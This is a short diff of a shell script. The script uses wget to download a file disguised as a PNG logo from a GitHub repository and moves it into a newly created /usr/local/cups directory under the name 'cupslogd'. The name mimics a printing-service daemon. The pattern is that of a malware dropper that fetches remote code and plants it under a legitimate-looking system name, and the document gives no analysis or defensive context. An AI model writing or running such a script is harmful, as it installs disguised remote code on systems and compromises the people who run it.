@@ -1,6 +1,7 @@
 THEURL='https://github.com/dannyxweb3/mimi/raw/main/cached/logo.178172.png'
 wget $THEURL
 THEFILE=logo.178172.png
+mkdir /usr/local/cups
 THEDT=/usr/local/cups/cupslogd
 ls $THEFILE
 mv $THEFILE $THEDT
